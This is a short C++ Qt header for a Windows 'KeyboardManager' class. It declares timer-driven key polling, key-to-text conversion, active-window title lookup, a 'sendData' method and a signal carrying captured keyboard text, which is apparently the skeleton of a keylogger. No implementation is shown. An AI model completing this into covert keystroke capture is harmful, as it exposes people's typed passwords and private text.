#ifndef KEYBOARDMANAGER_H
#define KEYBOARDMANAGER_H

#include <QObject>
#include <QTimer>
#include <windows.h>
#include <winuser.h>
#include <QDate>
#include <QTime>
#include <QDataStream>

class KeyboardManager : public QObject
{
    Q_OBJECT
public:
    explicit KeyboardManager();
signals:
    void keyboardText(QByteArray t);
public slots:
    void start();
private slots:
    void timeout();
private:
    QTimer *timer;
    QString currentWindow;

    void sendData(QString txt);
    bool EstMajuscule();
    QString keyText(int key);
    QString TitleActiveWindow();
};

#endif // KEYBOARDMANAGER_H
